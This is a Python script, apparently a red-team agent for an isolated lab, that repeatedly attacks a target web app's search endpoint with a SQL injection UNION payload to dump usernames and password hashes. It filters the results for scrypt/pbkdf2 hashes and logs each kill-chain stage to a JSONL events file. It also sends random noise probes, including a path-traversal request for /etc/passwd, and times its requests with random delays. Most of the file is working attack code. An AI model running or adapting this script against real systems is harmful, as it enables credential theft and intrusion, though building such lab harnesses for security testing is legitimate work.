#!/usr/bin/env python3
"""Isolated red-team agent — credential theft via SQLi on lab target.

Runs inside the redteam container only (no host repo mount). Writes
structured events to JSONL matching ObjectiveEvent schema.
"""

from __future__ import annotations

import argparse
import json
import random
import re
import time
import uuid

import requests

CLASS_ID = "T1555_sqli_cred_theft"
STAGE_RECON = "recon"
STAGE_EXPLOIT = "exploit"
STAGE_POST_EXPLOIT = "post_exploit"

_ROW_RE = re.compile(r"<li><b>(.*?)</b>: (.*?)</li>")
_HASH_RE = re.compile(r"^(scrypt|pbkdf2):")
_UNION_PAYLOAD = "' UNION SELECT username, password_hash FROM users -- "
_NOISE_PATHS = ("/admin", "/api/users", "/login", "/../../etc/passwd")


def log_event(path: str, stage: str, success: bool, evidence: str, round_id: str) -> None:
    row = {
        "class_id": CLASS_ID,
        "stage": stage,
        "success": success,
        "ts": time.time(),
        "evidence": evidence,
        "round_id": round_id,
    }
    with open(path, "a", encoding="utf-8") as f:
        f.write(json.dumps(row) + "\n")
        f.flush()


def attempt_cred_theft(base: str, session: requests.Session, events_path: str, round_id: str) -> bool:
    """One kill-chain attempt. Returns True if verified hashes stolen."""
    try:
        r = session.get(f"{base}/search", params={"q": ""}, timeout=5)
        recon_ok = r.status_code == 200 and "search" in r.text.lower()
    except requests.RequestException as exc:
        log_event(events_path, STAGE_RECON, False, str(exc), round_id)
        return False
    log_event(events_path, STAGE_RECON, recon_ok, f"status={r.status_code}", round_id)
    if not recon_ok:
        return False

    time.sleep(random.uniform(0.2, 1.0))

    try:
        r = session.get(f"{base}/search", params={"q": _UNION_PAYLOAD}, timeout=5)
        exploit_ok = r.status_code == 200
    except requests.RequestException as exc:
        log_event(events_path, STAGE_EXPLOIT, False, str(exc), round_id)
        return False
    log_event(events_path, STAGE_EXPLOIT, exploit_ok, f"status={r.status_code}", round_id)

    time.sleep(random.uniform(0.2, 0.8))
    rows = _ROW_RE.findall(r.text)
    creds = [(u, h) for u, h in rows if _HASH_RE.match(h)]
    success = len(creds) > 0
    log_event(events_path, STAGE_POST_EXPLOIT, success, f"count={len(creds)}", round_id)
    return success


def noise_probe(base: str, session: requests.Session) -> None:
    path = random.choice(_NOISE_PATHS)
    try:
        session.get(f"{base}{path}", timeout=3)
    except requests.RequestException:
        pass


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--target", default=None, help="Base URL, e.g. http://target-server")
    p.add_argument("--target-host", default="target-server")
    p.add_argument("--duration-sec", type=float, default=1200.0)
    p.add_argument("--stop-on-success", action="store_true")
    p.add_argument("--events", default="/events/redteam.jsonl")
    p.add_argument("--round-id", default="")
    args = p.parse_args()

    base = args.target or f"http://{args.target_host}"
    round_id = args.round_id or uuid.uuid4().hex[:12]
    events_path = args.events

    # Fresh log for this run
    open(events_path, "w", encoding="utf-8").close()

    session = requests.Session()
    t0 = time.time()
    attempt = 0
    while time.time() - t0 < args.duration_sec:
        attempt += 1
        if random.random() < 0.15:
            noise_probe(base, session)
        if attempt_cred_theft(base, session, events_path, round_id):
            if args.stop_on_success:
                return 0
        time.sleep(random.uniform(1.0, 4.0))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
